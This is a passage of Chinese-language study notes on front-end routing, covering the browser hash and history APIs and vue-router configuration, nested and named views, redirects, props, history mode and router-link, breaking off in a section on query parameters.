上面介绍了前端路由的概念, 它的核心就是改变url的时候让页面不要刷新  
因为只要改变了地址栏里的url, 默认它会重新向服务器请求资源, 但现在我不让它刷新, 因为我要让它在前端这边改变

<br>

### url的hash
url的hash也就是锚点, 本质上是改变 window.loacation 的href属性  
我们可以通过直接赋值 ``location.hash`` 来改变地址(href), **但是页面不发生刷新**

<br>

### **<font color="#C2185B">location.hash</font>**  
我们可以通过这种方式去改变url, 实现页面不刷新

当前页面: http://localhost:8080/ 通过location.hash = 'xxx'
```js
// 给url赋值一个hash
location.hash = 'aaa'

// 结果: http://localhost:8080/#aaa
```

我们改变了url但是网页并没有刷新, 然后我们通过前端路由在路由表中找到映射去请求组件, 把组件在页面中进行渲染

<br>

### **<font color="#C2185B">history.pushState()</font>**  
我们通过这种方式改变url页面也不会刷新 这种方式有些像压栈和出栈

<br>

**参数1:**  
{data}: 状态对象, 可传空

<br>

**参数2:**  
title: 新网页的标题, 可传空

<br>

**参数3:**  
url: 新的网址, 必须和当前页面在同一个域

```js 
history.pushState({}, '', 'home')

// 结果
http://localhost:8080/home
```

<br>

### **<font color="#C2185B">history.pushState() 和 history.back() 相当于入栈和出栈</font>**  
我们的栈结构相当于一个杯子, 栈只有一个入口和出口, 这里我们的pushState()方法相当于入栈, back()方法相当于把栈顶的东西移除掉

```js 
history.pushState({}, '', 'home')     push  home
history.pushState({}, '', 'about')    push  about
history.pushState({}, '', 'me')       push  me
```
```
|         |
|  me     |     栈结构
|  about  |
|  home   |
|_________|
```

我们使用 ``pushState()`` 方便连续的向栈中压入了3个url  

第一次压入的会在栈底 而我们从栈中拿数据的时候, 只能从栈顶开始拿, 所以它有个规则叫做 先进后出 栈顶上的url也是我们地址栏上显示的最新url, 这个url永远是最后压入的

一旦我调用 ``history.back()`` 就会将栈顶的东西移除掉, 就会显示接下来在栈顶的数据, 所以push 和 back相当于入栈和出栈的操作

<br>

### **<font color="#C2185B">history.replaceState()</font>**  
参数跟pushState()方法中的参数一样    
会用我们传入的url替换掉之前的url, back()方法(后退按钮将没有作用)
```js 
// 当前url
http://localhost:8080/home

history.replaceState({}, '', 'about');
http://localhost:8080/about
```

但是是将 ``http://localhost:8080/about`` 替换成 ``http://localhost:8080/home``
所以不会产生后退按钮, 没有历史记录

<br>

### **<font color="#C2185B">history.go()</font>**  
go()方法, 只能和 pushState()方法配合使用, 因为go()方法会跳到指定的栈中的位置

参数是数字   
- 正数是将url压入栈中  
- 负数是将url弹出栈顶

```js 
history.pushState({}, '', 'home')     push  home
history.pushState({}, '', 'about')    push  about
history.pushState({}, '', 'me')       push  me
```
```
|         |
|  me     |     栈结构
|  about  |
|  home   |
|_________|
```

```js 
history.go(-1);
// 弹出栈顶的me 会显示about
```

```js 
history.go(1)   相当于 history.forward()
history.go(-1)  相当于 history.back()
```

<br><br>

# 路由router
对于路由的理解 可以理解为 路由器和每一台电脑之间的关系 比如路由器后面的接口 就会对应着一台电脑 那么接口和电脑之间的关系就相当于一组组的key + value = 一组路由

路由和路由器的关系就是多个路由得由一个路由器进行管理
```js 
      路由器 router

接口     接口     接口   route
  
 |       |        |

电脑     电脑     电脑


接口 + 电脑 = key + value = 路由
```

<br><br>

## 路由器的概念 router
所谓的路由就是一组key-value的对应关系 多个路由需要经过路由器的管理  
router会监测path的变化 当发现符合规则的 路径时 ``/user`` 就显示对应的组件

vue-router是一个插件库 专用用来实现spa的应用, spa中的数据需要通过ajax来获取 既然是插件库 那么肯定需要安装插槽 和 使用插件

<br>

### 前端路由 和 后端路由

**前端路由:**   
- 理解: value是component 用于展示页面内容
- 流程: 当浏览器的路径改变的时候 对应的组件就会显示

<br>

**后端路由:** 
- 理解: value是function 用于处理客户提交的请求  
- 流程: 服务器收到一个请求时 根据请求路径找到匹配的函数来处理请求 返回响应数据

<br>

### 拆分html文件:
1. 把html文件所有的内容放入到 vue的template模板中
2. 决定导航区和展示区的内容 将展示区的内容定义成组件

<br><br>

## 路由的基本使用

### 安装:
下面的笔记都是按照 vue-router@2 来记录的 现在最新的版本为 vue-router@4 用法上都不一样 创建 router 实例的方式也不一样 所以在使用最新版本的 vue-router 的时候要看文档
```
npm i vue-router@2
npm i vue-router@3
```

<br>

### 创建: 路由配置文件 & 配置
```
| - router
  - index.js
```

<br>

### vue-router: 3.5
1. router/index.js 文件中 引入 vue
2. router/index.js 文件中 引入 vue-router
3. 注册路由插件
```js
import Vue from 'vue'
import VueRouter from 'vue-router'
Vue.use(Router)
```

4. 通过 new VueRouter 创建路由实例对象 并且暴露出去
```js
const router = new VueRouter({
  mode: 'history',
  base: process.env.BASE_URL,
  routes
})

export default router
```

<br>

### vue-router: 4.0
1. 引入创建路由的函数 决定history的模式
```js
import {createRouter, createWebHistory, createWebHashHistory} from "vue-router"
```

2. 调用 createRouter 创建路由实例对象 并暴露出去
```js
import {createRouter, createWebHistory, createWebHashHistory} from "vue-router"
import Home from "../views/Home.vue"

const routes = [
  {
    path: "/",
    component: Home
  }
]

const router = createRouter({
  history: createWebHistory(),
  routes
})

export default router
```

3. main.js中使用链式调用的方式注册路由
```js
createApp(App)
  .use(router)
  .use(vuetify)
  .mount('#app')
```

<br>

### 路由配置: routes
routes类型为数组 内部必须包含如下属性
```js
[
  {
    path: 指定uri部分 用来匹配组件
    component: 指定组件
  }
]
```

<br>

### 展示路由 和 路由跳转
```html
<!-- 展示路由 -->
<router-view>

<!-- 路由跳转 -->
<router-link>
```

当路径发生变化都要展示对应的组件 所以必须要有 ``<router-view>`` 而 ``<router-link>`` 相当于 a标签用于改变url

<br><br>
 
# 命名视图: ``<router-view name>`` 单页面中多个视图 
它可以在同一个组件内 展示更多的路由视图 而不是嵌套显示

命名视图可以让一个组件中具有多个路由渲染出口 这对于一些特定的布局组件非常的有用

命名视图的概念非常类似于 具名插槽 并且视图的默认名称也是 default

插槽是通过 slot-name 给插槽定义名称 然后通过名称定义存放的位置 命名视图是给router-view定义名称 然后通过name做匹配

<br>

### 命名视图的使用:  
我们在一组路由规则中使用 components 属性项, 也就是说原先我们一组路由为
```js
{
  path:
  component:
}
```

现在我们要修改为命名视图也就是一个页面中 有多个路由渲染出口 我们要将 component选项 -> components选项

components选项的类型为对象, 有如下结构组成
```js
{
  path: 
  components: {
    // 其中默认的视图名为 default
    视图名: 组件路径 如, () => import("./A.vue")
  }
}
```

<br>

**示例:**  
```js
import {createRouter, createWebHistory, RouterRecordRaw} from "vue-router"

const routes: Array<RouteRecordRaw> = [
  {
    path: "/",
    component: () => import("../components.root.vue"),

    // 定义一个页面中的多个子路由
    children: [
      {
        path: "/user1",
        // 使用 components 配置项
        components: {
          // 默认, 我们写 router-view 默认会找default
          default: () => import("./A.vue"),
        }
      },
      {
        path: "/user2",
        components: {
          custom2: () => import("./B.vue"),
        }
      },
      {
        path: "/user2",
        components: {
          custom3: () => import("./C.vue"),
        }
      }
    ]
  }
]


// 默认的视图名
<router-view></router-view>
// 具名视图
<router-view name="custom2"></router-view>
<router-view name="custom3"></router-view>
```

<br>

### 示例:
```js
import VueRouter from "vue-router"

import Page1 from "../components/Page1"
import Page2 from "../components/Page2"
import Wrap from "../components/Wrap"

const routes = [
  {
    path: "/",

    // 当路径是/的时候 组件显示在不同的区域
    components: {
      default: Wrap,
      // 这里的key就是 router-view name属性
      page1: Page1,  
      page2: Page2,
    }
  },
  {
    path: "/page1",
    component: Page1
  },
  {
    path: "/page2",
    component: Page2
  },
]

const router = new VueRouter({
  routes
})

export default router
```

<br><br>

## ``<router-view key>``  
由于vue会复用相同组件 所以当用一个组件不同路由发生跳转的时候 将不再执行 create mounted 之类的钩子函数

**设置key之后会在虚拟DOM阶段比对跳转前后的key值** 如果不同则重新重建页面

<br>

### 情况1: 不设值key
不设置 router-view 的 key 属性 

由于 Vue 会复用相同组件, 即 使用如下格式的路径进行跳转时 **<font color='#C2185B'>将不在执行created, mounted之类的钩子</font>** 也就是说它在复用组件

- 从 /page/1 到 /page/2
- 从 /page?id=1 到 /page?id=2

<br>

这时候你需要在路由组件中, 添加 beforeRouteUpdate 钩子来执行相关方法拉去数据

<br>

### **<font color='#C2185B'>beforeRouteUpdate(to,from,next)</font>**
beforeRouteUpdate是路由更新时触发的钩子函数, 它是用于在同一路由下的**组件复用时调用的**

在没有使用 key 属性的情况下, 路由切换不会触发组件的销毁和重新创建, 因此 beforeRouteUpdate 钩子不会被调用

如果您希望在没有使用 key 属性的情况下触发 beforeRouteUpdate 钩子, 可以考虑使用 watch 监听 $route 对象的变化, 并在变化时执行相应的逻辑。

<br>

### 扩展: $route.path 和 $route.fullPath
- $route.path: 表示当前路由的相对路径部分
```s
https://example.com/user/123?sort=desc

# $route.path
/user/123
```

- $route.fullPath: 表示当前路由的完整路径 包含完整的路径和查询参数
```s
https://example.com/user/123?sort=desc

# $route.fullPath
/user/123?sort=desc
```

<br>

### 情况2: key值为 $route.path
设置 router-view 的 key 属性值为 $route.path (uri部分 /user/1)

- 从 /page/1 到 /page/2

由于这两个路由的 $route.path 并不一样, 所以组件被强制不能复用 则相关钩子加载顺序为: 
```s
beforeRouteUpdate => created => mounted
```

- 

从 /page?id=1 到 /page?id=2

由于这两个路由的 $route.path 一样, 所以和没设置 key 属性一样, 会复用组件, 则相关钩子加载顺序为: 
```s
beforeRouteUpdate
```

<br>

### 情况3: key值为 $route.fullPath
设置 router-view 的 key 属性值为 $route.fullPath

- 从 /page/1 到 /page/2

由于这两个路由的route.fullPath并不一样, 所以组件被强制不复用 则相关钩子加载顺序为: 
```s
beforeRouteUpdate => created => mounted 
```

<br>

- 从 /page?id=1 到 /page?id=2

由于这两个路由的route.fullPath并不一样, 所以组件被强制不复用 则相关钩子加载顺序为: 
```s
beforeRouteUpdate => created => mounted 
```

<br><br>

# 嵌套路由
一级路由 和 二级路由 如果一级路由里面再有路由那么它就是二级路由

<br>

### 嵌套的 router-view 的理解:
```s
| - App组件 -> router-view
  | - Test组件 -> router-view
```

我们可以看到 App组件中有 router-view 它是作为一级路由的出口

Test组件下面也有一个 router-view 则当我们配置/test路由规则的时候 如果/test有子级路由的话 则它的子级路由会在 Test组件内的 router-view中展示

```s
{
  path: '/test',
  name: 'test',
  component: Test,
  children: [
    {
      path: "test1",
      component: () => import("../components/Test1.vue")
    },
    {
      path: "test2",
      component: () => import("../components/Test2.vue")
    },
  ]
},
```

<br>

### routes中的 children属性
当一组路由规则中 包含子级路由的时候 我们需要在该组的路由规则中使用 children属性

children属性的类型为数组 里面是一组组的子级路由规则

```js
const routes = [
  {
    path: "/home",
    component: Home,

    // Home下的子级路由
    children: [
      {
        path: 
        component: 
      }
    ]
  }
]
```

<br>

```js 
routes = {
  {
    // 一级路由
    path: "/about",
    components: About

    // 配置二级路由
    children: [
      {
        // path: '/news'  这就是错的

        // 这就是对的  二级路由不要带 / 直接写uri不要加斜杠 news
        path: 'news'   
        components: News
      }
    ]
  }
}

 // 结果:  /about/news
```

<br>

### 关于子级路由前是否加 / 
- 子级路由前不加 / 则说明路径是相对于 父级路由的 **这种方式使得子路由的路径是相对于父级路由的, 符合嵌套路由的结构**
```s
{
  path: '/test',
  component: Test,
  children: [
    {
      path: "test1",
      component: Test1
    }
  ]
}

# /test/test1
```

- 子级路由前 加 / 则说明路径是相对于根路径的 **这种方式使得子路由的路径是相对于根路由的, 独立于父级路由的路径。**
```s
{
  path: '/test',
  component: Test,
  children: [
    {
      path: "/test1",
      component: Test1
    }
  ]
}

# /test1
```

<br>

无论是加斜杠还是不加斜杠, 子路由的组件都能正常展示。

区别在于生成的 URL 和路径的表示方式。选择是否加斜杠取决于您的需求和路由结构的设计。

- 如果希望子路由的路径是相对于父级路由的, 应该省略斜杠
- 如果希望子路由的路径是相对于根路由的, 应该加上斜杠

<br>

### 总结:
1. 嵌套路由中的子级路由 路径前 加 / 和 不加/ 该组件都会在Test组件中的 router-view 中展示

2. 加 / 和 不加/的区别在于 url 中的路径呈现方法 是基于父级路由呈现 还是 基于根路径呈现
```s
/test/test1
/test1
```

<br>

### 注意:
- 子级路由的路径前 不加 / 则子级路由相对于父级 访问方式为: localhost:8080/test/test1

- 子级路由的路径前 加 / 则子级路由相对于根路径 访问方式为: localhost:8080/test1
```s
这时如果我们通过 localhost:8080/test/test1 来访问组件则展示空白 因为找不到
```

<br>

```js 
// 比如 我们的 welcome 组件就要在 home 的 router-view 中展示 那 welcome就是home的子组件 就要配置在 home的children里面
{
  path: "/home",
  component: Home,
  redirect: "/welcome",
  children:[
    {
      // 方式1:  path里面加 / 
      // 代表路径为 http://localhost:8080/welcome 单开形式
      path:"/welcome",

      // 方式2: path里面不加 / 
      // 代表路径为 http://localhost:8080/home/welcome 嵌套路由形式
      path:"welcome",

      component: Welcome
    }
  ]
},
```

<br>

### 注意2: 子级路由前不加 / 的说明
vue发现一级路由中有children属性的时候会自动遍历该数组 然后自动在二级路由的前面添加 /, 所以我们在二级路由的前面不要添加 /

<br>

### 使用 router-link 跳转到子级路由时
我们在 ``<router-link to='/home/news'>`` 要展示二级路由的时候要带上完整的路径 也就是 一级路径/二级路径

<br><br>

## 路由配置规则 routes
```js 
const router = new VueRouter({
  routes: [
    {
      name: 
      path:
      component:
      children:
      redirect:
      alias:
      props:
    }
  ]
})
```

<br>

### **<font color="#C2185B">配置项: name</font>**  
配置该路由信息的别名

<br>

**作用:**   
让我们在多级路由跳转的时候简化编码 同时 在使用 路由别名 进行跳转的时候要使用以下的形式
```html
<router-link :to='{name: 路由别名}'>
```

```js 
const routes = [
  {
    name: 'xinxi'
    path: '/home/message',
    component: xxx
  }
]
```
```html
<!-- 正常跳转 -->
<router-link to='/home/message/detail'>

<!-- 使用路由别名进行跳转 -->
<router-link :to='{name: xinxi}'>
```

<br>

### **<font color="#C2185B">配置项: path(uri部分)</font>**  
router会检查 uri 部分 匹配对应的组件

<br>

### **<font color="#C2185B">配置项: component: 组件</font>**  
uri匹配上后 指定对应的组件

懒加载形式: ``() => import("路径")``

<br>

### **<font color="#C2185B">配置项: components</font>**  
当有多个 router-view 的时候 使用的配置

<br>

### **<font color="#C2185B">配置项: children</font>**  
嵌套的路由 二级路由uri前面不用写 /

<br>

### **<font color="#C2185B">配置项: redirect:"/uri"</font>**  
当匹配到某个路径的时候我们重定向到某个组件
```js 
const routes = [
  {
    path:'/',
    redirect: '/home'
  }
]
```

<br>

如果我们要重定向到二级路由中的其中一个路由时, redirect的值要带上父级路由
```js
const routes = [
  {
    path:'/home',
    component: Home,
    // 携带上父级路由
    redirect: "/home/home1",
    children: [
      {
        path: "home1"
        component: Home1
      }
    ]
  }
]
```

<br>

### **<font color="#C2185B">配置项: redirect: {}</font>**  
redirect属性值的类型可以是一个对象 我们可以通过内部的name属性 使用路由的别名进行重定向
```js 
const routes = [
  {
    path:'/',

    redirect: {
      name: "一个路由中的name值"
    }
  }
]
```

<br>

### **<font color="#C2185B">配置项: redirect: to => { ... }</font>**  
redirect属性值的类型可以是一个函数, 函数中需要返回一个路径 可以返回字符串 或者 对象形式 

to: 父路由的所有信息
```js
{
  name: 当前路由的名称,
  path: 当前路由的路径,
  hash: URL 中的哈希值,
  query: URL 中的查询参数,
  params: 动态路由参数
}
```

```js
const routes = [
  {
    path:'/',

    redirect: to => {
      return "/user1"

      // 对象形式 重定向的时候可以传参
      return {
        path: "/user1",
        query: {
          name: "sam"
        }
      }
    },


    redirect: to => {
      // 根据当前路由的信息决定重定向的目标路径
      if (to.path === '/old-path') {
        return '/new-path';
      } else {
        return '/default-path';
      }
    }
  }
]
```

在路由的重定向配置中, to 参数代表重定向的目标, 它可以是父级路由也可以是当前的路由, 具体取决于您在哪个路由配置中进行了重定向的设置。

如果重定向配置是在父级路由中定义的, 那么 to 对象将代表当前的路由信息, 包括当前路由的路径、参数、查询参数等。

如果重定向配置是在子路由中定义的, 那么 to 对象将代表父级路由的路由信息, 即父级路由的路径、参数、查询参数等。

<br>

### **<font color="#C2185B">配置项: alias: [""]</font>**  
我们给 test1 这条路由规则起了一个别名 我们通过下面的路径访问组件时 都可以访问到

- /test/test1
- /test/user (通过别名)

```js
const routes = [
  {
    path: '/test',
    name: 'test',
    component: Test,
    children: [
      {
        path: "test1",
        alias: "user",
        component: () => import("../components/Test1.vue")
      }
    ]
  },
]
```

<br>

### **<font color="#C2185B">配置项: props</font>**  
下面的写法 **三选一**  

我们通过 路由配置中的props定义的数据 都是需要在该组件中的props配置项中声明接收后 数据可以通过this来读到

<br>

### 定义方式1: 对象形式
适用于向该条路由对应的组件传递 死数据, 数据需要在该组件的 props 中接收

```js
const routes = [
  {
    name:
    path:
    component:

    props: {
      k:v
    }
  }
]
```

props中的k v会以props形式传递给组件 该组件要以props来接收 这种形式提供的数据是死数据

<br>

**使用方式:**  
- 路由配置文件中使用 props 配置项传递
- 目标组件就要使用 props:["变量"] 来接收

没有接收的话 在 this.$attrs 身上 如果有接收的话 就会在this身上

<br>

### 定义方式2: 布尔值
若布尔值为真 就会把该路由组件收到的所有params参数 以props的形式传给xxx组件

该组件需要在 props 中接收 别人使用params形式传递的数据 使用该方式接收到的数据都会在vm身上

<br>

**使用方式:**  
- 该组件的路由配置文件中的 path/:id/:gender 定义接收数据的变量
- 在该组件中使用props注册该变量
```js 
const routes = [
  {
    name: 'xinxi',
    path: '/home/message/:id/:title',
    component: xxx组件

    // 设置为true
    props: true
  }
]

// xxx组件
props: ['id', 'title']
```

正常我们要接收 params 参数 需要在 $route.params 上接收

<br>

### 定义方式3: 函数
该函数必须有返回一个对象 对象中的key value会以props的形式传递给xxx组件

该函数可以接收到 $route 参数 这样就可以整理 query 和 params 把他们传递到 props 中 该组件就可以去props中接收

```js 
const routes = [
  {
    name: 'xinxi',
    path: '/home/message/:id/:title',
    component: xxx组件

    props($route) {

      // 这个返回的对象会在组件实例的props身上
      return {
        id: $route.query.id,
        title: $route.query.title'
      }
    }
  }
]

// xxx组件
props: ['id', 'title']
```

<br>

### 总结:
1. 对象的写法传递的数据是死数据
2. 布尔写法为true时 params 形式的数据 会被传到路由组件的 props 身上
3. 函数式写法 函数的第一个参数为 $route 所以可以拿到 query 形式 和 params 形式的数据 我们可以将这两种形式的参数 通过返回值都放到 props 中

不管哪种方式 都需要在对应组件中使用 props 配置项 声明后接收

<br>

## 路由: history模式
```
www.baidu.com/?name="sam"#hash
```

url上从 # 开始到后面都是hash值, hash最大的特点就是它不会随着http请求随着路径发给服务器

整个vue中有两种工作模式 hash模式 和 history模式 我们可以在路由的配置文件里面 添加配置项 修改 vue路由的工作模式

有人说 history 坑很多 hash的兼容性比较好 history的兼容性略差

<br>

### 还有啥区别?
一个请求资源的问题 使用hash的时候#后面不会当做请求资源发送给服务器 

但是 history模式就会拿着路径去服务器的接口中请求数据
```js 
localhost:8000/#/user/message
// hash模式  #/user/message 不会将这些发送给服务器请求资源

localhost:8000/user/message
// history模式 刷新的时候 会拿着整体的路径去找接口
```

<br>

### 使用history模式的问题:
在项目上线的时候 我们项目要上线部署到服务器 那么就需要先进行打包 生成最纯粹的html css js 因为我们往服务器上放的必须是这些文件

比如我们可以将我们打包后的文件部署到服务器上的 static里面 当发起请求的时候 我们就给会看index.html页面

但是有一个问题 我们在点击页面的时候都是通过路由来跳转的 当一刷新页面的时候就会报错  因为一刷新我就要根据路径请求资源

首次刷新请求回来的一个页面 是 / 接口响应的
首页的展示是 localhost:8000/

当我点了很多路由后路径变成 localhost:8000/user/message
由于后台没有对应的接口 就会显示404

<br>

### history怎么解决404的问题呢? 
需要后端工程师配合 它要将路径上的资源 和 后台的所有接口进行一个匹配 最终决定下 哪些是前端路由的 哪些是后端路由的

nodejs里面有一个专门用来解决 history 404问题的中间件
nodejs 里面要安装依赖

```s
npm install --save connect-history-api-fallback

https://www.npmjs.com/package/connect-history-api-fallback
```

<br>

### 要点:
该包必须在静态资源设置前使用
```js 
const express = require('express')
const history = require('connect-history-api-fallback')
const app = express()

// 使用插件 它是一个函数要调用
app.use(history());

// history的使用必须在设置静态资源前
app.use(express.static(__dirname+'public'))

app.get('/', (req, res) => { 
  // 这里不用写返回首页的逻辑 好像自动去找index页面
})
```

还可以使用nginx 它会分析我们的请求是前端路由还是后端路由

<br><br>

## router中的配置: mode配置项
该配置项跟 routes 同级别

通过该配置项可以修改路径的显示模式
```js 
const router = new VueRouter({
  routes,
  mode: 'history'
})
```
 
<br>

### 总结
**hash模式:** 
1. 地址栏中永远带着#号 不美观
2. 若以后将地址通过第三方收集app分享 若app校验严格 则地址会被标记为不合法
3. 兼容性好

<br>

**history模式:**
1. 地址干净 美观
2. 兼容性和hash模式相比略差
3. 应用部署上线时候需要后端人员支持 解决刷新页面服务器端404的问题

<br>

### 总结: routes中的配置
```js
{
  // url路径
  path: string, 

  //非命名视图
  component: Component,

  // 命名路由, 给路由起个名字
  name: string, 

  // 命名视图组件
  components: { name1: Component1, name2: Component2}, 

  //重定向
  redirect: string | Location | Function,

  //props
  props?: boolean | Object | Function,

  //别名
  alias: string | Array<string>,

  // 嵌套的子路由
  children: Array<RouteConfig>, 

  //可以添加路由监听
  beforeEnter?: (to: Route, from: Route, next: Function) => void,

  //存一些自己定义的参数啥的
  meta: {{isData: true}},

  // 匹配规则是否大小写敏感? (默认值: false)
  caseSensitive: boolean, 

  // 编译正则的选项
  pathToRegexpOptions: Object 
}
```

<br><br>

## router中的配置: scrollBehavior

```js
const router = new VueRouter({
  //路由模式控制 history 和 hash
  mode: 'history',

  // 路由列表
  routes: routes 

  //路由前缀
  base:  '/' ,  


  // 路由的滚动行为
  scrollBehavior (to, from, savedPosition) {
    // return {x:0, y:0}期望滚动到哪个的位置
  }
})
```

<br>

### 路由的滚动行为: scrollBehavior
使用前端路由 当切换到新路由的时候 想要页面滚到到顶部 或者是保持原先的滚动位置 

就像是重新弄加载页面那样 vue-router 可以自定义路由切换时页面如何滚动

<br>

scrollBehavior 在 router 的配置项中 跟 history 是同级

该方法会接收 to from savedPosition 三个参数

<br>

**注意:**  
savedPosition只能当 popstate 导航(通过浏览器的前进 后退 按钮触发)时才可使用
```js
const router = createRouter({
  history: createWebHistory(),

  scrollBehavior: (to, from, savedPosition) => {
    ...
  }
  
})
```

<br>

**savedPosition参数:**  
返回滚动位置的对象信息, vue来标记的距离, 当页面没有滚动条的时候 会返回null

当我们通过 历史记录前进后退的时候 savedPosition juice会记录上一个页面的位置

```js
{
  left: number,
  top: number
}
```

<br>

**示例:**
```js
const router = createRouter({
  history: createWebHistory(),

  scrollBehavior: (to, from, savedPosition) => {
    // 这里我们将上一个页面的值直接返回就可以
    if(savedPosition) {
      return savedPosition
    } else {
      return {
        // vue3是top left vue2是x y
        top: 0
      }
    }
  }
})
```

<br><br>

# ``<router-link>``
上面已经配置到了路由的规则 现在我们完成点击标签更改路径 和 匹配组件的逻辑

原始html中使用a标签实现页面的跳转 但是在vue中我们不能使用a标签来进行跳转而是要使用vue-router这个库给我们提供的专用标签``<router-link>`` 标签**实现路由的切换**

<br>

### ``<router-link to='uri接口部分 /user' active-class=''>``
``<router-link>`` 是vue-router插件库给我们提供修改路径的方式

<br>

### **<font color="#C2185B">标签属性: to</font>**    
希望跳转的路径, 形式为 /路径 

```html
<!-- 在组件中动态生成路由链接 -->
<template>
  <div>
    <router-link :to="generateProductLink(123)">Product 123</router-link>
  </div>
</template>

<script>
// 假设有一个路由配置如下
const routes = [
  {
    path: '/products/:id',
    name: 'product',
    component: ProductComponent
  }
];


export default {
  methods: {
    generateProductLink(productId) {
      return {
        name: 'product',
        params: { id: productId }
      };
    }
  }
};
</script>
```

<br>

### **<font color="#C2185B">标签属性: active-class</font>**    
该元素被激活时候的样式 值为类名 原本的class照常写

可以理解为``<a>``标签, 是vue-router中注册过的组件, 这两个组件是全局组件可以在任何的文件中用, 

``<router-link>`` 最终会被渲染成 ``<a>``

可以将url中的地址改成 to后面的值, 这样当地址栏中出现/home的时候就会映射到对应的组件上

<br>

### **<font color="#C2185B">标签属性: replace</font>** 
```html
<router-link replace>
```

控制路由跳转时操作浏览器历史记录的模式

<br>

浏览器的历史记录有两种写入方式:  
- push: 追加历史记录
- replace: 替换当前记录

路由跳转时候默认为push

<br>

我们每一次点击后退都会留下历史记录 浏览器是一个栈结构 我们每次点击一个链接后 都会将该记录压入栈 后点的会在最上方 栈中有一个指针始终指向栈顶

历史记录操作的push模式  

每当我们点击一次后退的时候指针就会下移一位 前进和后退就是一个操作指针的过程 我们通过``<router-link>`` 跳转的链接 每一次点击都会留下历史记录 默认是push操作 就是可以依次回退

<br>

它最大的特点就是替换当前栈顶的那一条 每次点击一次链接后 都会替换掉上一条 也就是说栈里面始终只有一条 <font color="#C2185B">它不会能回退</font>

<br>

### 举例:
可以将url中的地址改成 to后面的值, 这样当地址栏中出现/home的时候就会映射到对应的组件上
```html
<router-link to='/home'>首页</router-link>
<!-- http://localhost:8080/#/home -->
```

<br>

``<router-view>`` 决定要被渲染的组件在什么位置的 某个组件渲染之后会替代``<router-view>``的位置, 相当于占位的

```html 
<!-- 在页面上创建两个标签, 当点击home的时候显示home的组件, 当点击about的时候显示about的组件 -->
<template>
  <div id="app">
    <router-link to='/home'>首页</router-link>
    <router-link to='/about'>关于</router-link>
  </div>
</template>

<!-- 
  页面中会出现 两个链接, 每点击一个链接会出现 首页 关于 
  http://localhost:8080/#/home
  http://localhost:8080/#/about

  一旦点击链接按钮后地址栏变为对应地址应该在页面中的某一个区域内显示出来
-->
<template>
  <div id="app">
    <router-link to='/home'>首页</router-link>
    <router-link to='/about'>关于</router-link>

    <router-view></router-view>
  </div>
</template>
```

<br>

### 注意:
切换掉的组件 其实是被销毁了 比如我们从a切换到了b 展示的b 那么a组件就被销毁了

在路由切换时, **切换的是``<router-view>``挂载的组件**, 其它内容不会发生改变

<br><br>

# 路由组件 和 一般组件
- 一般组件: 我们自己写的 组件标签 展现的组件  
- 路由组件: 通过监测路径的变化 vue-router 自己匹配的组件 在router-view里面呈现

<br>

### 书写规范:
- 一般组件 一般放在components文件夹中  
- 路由组件 一般放在pages文件夹中

<br>

### 路由组件的特点:
**路由组件上特有的对象: $router $route**

<br><br>

## $route对象
每一个组件都有自己的 ``$route`` 里面存储的是自己的路由信息 里面还有vue-router添加进去的一些属性

每一个组件的``$route``都是不一样的(值不一样)

``$route``表示当前激活的路由的状态信息 包含了当前 URL 解析得到的信息, 还有 URL 匹配到的 route records(路由记录)。

```js
$route: {
  // 它带参数
  fullPath: "/test/user?name=sam",
  // 它不带参数
  path: "test/user",
  hash: "",
  meta: {},
  name: "test1",  // 没有则是undefined
  params: {},
  // 查询字符串部分会被收集到这里
  query: {name: "sam"},
  matched: [
    // /test对应的路由信息
    {
      alias: [],
      beforeEnter: f,
      components: {},
      // 进入路由时触发的回调函数, 用于处理路由切换后的逻辑
      enteredCbs: {},
      // 路由对应的组件实例
      instance: {defalt: VueComponent},
      matchAs: undefined,
      meta: {},
      name: "test",
      // 父级路由记录对象, 用于指定父级路由 undefined表示该路由记录本身就是父级路由
      parent: undefined,
      path: "/test",
      props: {default: {}},
      redirect: undefined
    },
    // /test/test1对应的路由信息
    { ... }
  ]
}
```

<br>

### $route.matched
当前的组件路径为 /test/test1 那么 ``$route.matched`` 数组是按照路由的嵌套层级顺序 将匹配到的路由放入到 数组中

/test/test1 路径的话 则会将
- 会依次将 /test路径 对应的路由信息放入到数组中
- 会依次将 /test/test1路径 对应的路由信息放入到数组中

<br>

**技巧:**
- $route.matched[0] 表示 根路由
- $route.matched[$route.matched.length - 1] 表示当前路由

```js
// 假设当前路由为 /foo/bar
console.log($route.matched[0].path); // 输出根路由的路径 '/'
console.log($route.matched[1].path); // 输出父级路由的路径 '/foo'
console.log($route.matched[2].path); // 输出当前路由的路径 '/foo/bar'

console.log($route.matched[2].meta); // 输出当前路由的元信息对象
```

<br><br>

## $router对象: 路由器
当我们导入 Vuerouter 后整个应用就会多出一个 $router 且只有一个 所有的路由都归它管

<br>

### $router身上的属性:
```js
VueRouter: {
  afterHooks: [],
  // Vue 实例, 表示当前应用的根 Vue 实例
  app: Vue {_uid: 0, _isVue: true, $options: {…}, _renderProxy: Proxy, _self: Vue, …}
  // 一个数组, 包含当前使用 Vue Router 的 Vue 实例
  apps: [Vue],
  beforeHooks: [],
  fallback: false,
  history: HashHistory {router: VueRouter, base: '', current: {…}, pending: null, ready: true, …}

  // 路由匹配器对象, 包含路由匹配相关的方法和功能
  matcher: {
    match: ƒ,  // 用于执行路由匹配的方法。
    addRoute: ƒ,  // 用于添加路由的方法
    getRoutes: ƒ, // 用于获取所有路由的方法
    addRoutes: ƒ  // 用于批量添加路由的方法
  }
  mode: "hash"

  // routes
  options: {
    base: "/",
    mode: "history",
    routes: Array(1)
  }
  resolveHooks: []
  // 当前的url对应的路由
  currentRoute: Object
}
```

<br>

**$router.options.routes**  
可以获取 routes 路由数组

<br><br>

# 路由传参: query形式传递
本质也就是查询字符串参数

<br>

### 优点: 
刷新页面参数不丢失

<br>

### 案例: 
页面上有3个按钮 我们点击按钮 展示该按钮对应的详情页面 

但是详情页面只是一个组件 也就是我们 我们要用这一个组件展示3个按钮对应的不同内容 比如这个展示区要展示 id title

<br>

### 思路:
由于数据在按钮的组件当中 那我们是不是可以在点击按钮的时候 向路由组件传递数据 将详情组件想要展示的东西传递过去(路由能接收两种参数)

<br>

### 传递 query 参数: url后缀参数
我们可以在路径中使用?的形式带着参数过去
```js
<router-link 
  to='/home/message/detail?id=666&title=你好呀'
>

<router-link 
  :to='`/home/message/detail?id=${item.id}&title=${item.title}`'
>
```

<br>

### 目标组件接收 query 参数:
通过 ``this.$route.query`` 接收到 它是一个对象
```js 
this.$route.query = {
  id: "666",
  title: "你好呀"
}

this.$route.query.name
```

<br>

### 传递 query 参数: 对象式写法
我们要在 to 前 使用 v-bind 指定一个对象
```html
